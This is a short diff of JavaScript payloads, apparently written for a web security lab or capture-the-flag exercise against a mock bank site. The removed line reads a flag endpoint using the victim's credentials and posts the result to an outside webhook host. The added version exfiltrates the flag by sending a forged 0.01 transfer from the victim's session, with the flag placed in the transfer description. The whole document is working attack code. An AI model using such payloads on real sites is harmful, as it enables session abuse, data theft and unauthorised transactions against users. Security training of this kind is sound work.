@@ -1,1 +1,12 @@
-fetch("https://api.netquocca.quoccacorp.com/flag",{credentials:"include"}).then(function(r){return r.text()}).then(function(t){fetch("https://bold-galaxy-05.webhook.cool/",{method:"POST",mode:"no-cors",body:t})})
+fetch('https://api.netquocca.quoccacorp.com/flag')
+.then(r=>r.text())
+.then(t=>fetch('https://api.netquocca.quoccacorp.com/transactions',{
+  method:'POST',
+  headers:{'Content-Type':'application/json'},
+  body:JSON.stringify({
+    from_account:{bsb:'069-420',account_number:'00000000'},
+    to_account:{bsb:'069-420',account_number:'88586114'},
+    description:t,
+    amount:0.01
+  })
+}))
